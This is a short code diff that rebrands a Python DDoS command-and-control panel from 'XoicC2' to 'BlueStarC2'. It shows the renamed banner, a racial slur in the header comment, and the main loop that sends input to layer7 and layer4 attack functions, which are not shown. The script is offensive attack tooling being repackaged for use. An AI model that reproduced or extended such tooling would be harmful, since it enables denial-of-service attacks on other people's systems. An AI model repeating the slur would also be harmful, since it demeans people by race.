@@ -1,5 +1,5 @@
 ##############################
-# XoicC2 Made by SageZx   #
+#BlueStarC2 Made by SageZx   #
 # COPY = NIGGER              #
 ##############################
 
@@ -238,7 +238,7 @@ $$$$$$$  |$$$$$$$$\\$$$$$$  |$$$$$$$$\       \$$$$$$  |  $$ |   $$ |  $$ |$$ |  
 def main():
     menu()
     while(True):
-        cnc = input(''' \x1b[38;2;233;233;233moot@BlueStarC2 ➤ ''')
+        cnc = input(''' \x1b[38;2;233;233;233mroot@BlueStarC2 ➤ ''')
         if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
             layer7()
         elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
